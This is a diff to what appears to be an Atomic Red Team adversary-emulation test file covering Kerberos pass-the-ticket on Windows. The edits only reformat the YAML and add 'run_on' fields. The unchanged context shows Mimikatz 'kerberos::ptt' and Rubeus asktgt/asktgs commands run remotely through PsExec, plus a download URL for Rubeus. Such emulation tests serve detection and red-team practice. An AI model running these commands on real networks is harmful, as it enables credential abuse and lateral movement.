@@ -9,7 +9,8 @@ atomic_tests:
   - windows
   input_arguments:
     ticket:
-      description: Ticket file name usually format of 'id-username\@domain.kirbi' (e.g. can be dumped by "sekurlsa::tickets /export" module)
+      description: Ticket file name usually format of 'id-username\@domain.kirbi'
+        (e.g. can be dumped by "sekurlsa::tickets /export" module)
       type: string
       default:
     mimikatz_exe:
@@ -34,6 +35,8 @@ atomic_tests:
     command: |
       "#{mimikatz_exe}" "kerberos::ptt #{ticket}"
     name: command_prompt
+  run_on:
+  - windows
 - name: Rubeus Kerberos Pass The Ticket
   auto_generated_guid: a2fc4ec5-12c6-4fb4-b661-961f23f359cb
   description: |
@@ -61,7 +64,8 @@ atomic_tests:
     rubeus_url:
       description: URL of Rubeus executable
       type: url
-      default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
+      default: 
+        https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -83,7 +87,7 @@ atomic_tests:
   executor:
     name: powershell
     elevation_required: true
-    command: |
+    command: |-
       & "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" -accepteula \\#{target} -w c:\ -c "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" asktgt /user:#{user_name} /password:#{password} /domain:#{domain} /outfile:ticket.kirbi
       Set-Location "PathToAtomicsFolder\..\ExternalPayloads"
       Move-Item -Force "\\#{target}\c$\ticket.kirbi" ticket.kirbi
@@ -91,3 +95,5 @@ atomic_tests:
       & "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" asktgs /service:cifs/#{target} /ticket:ticket.kirbi /ptt
       Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\ticket.kirbi"
       & "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" purge      
+  run_on:
+  - windows
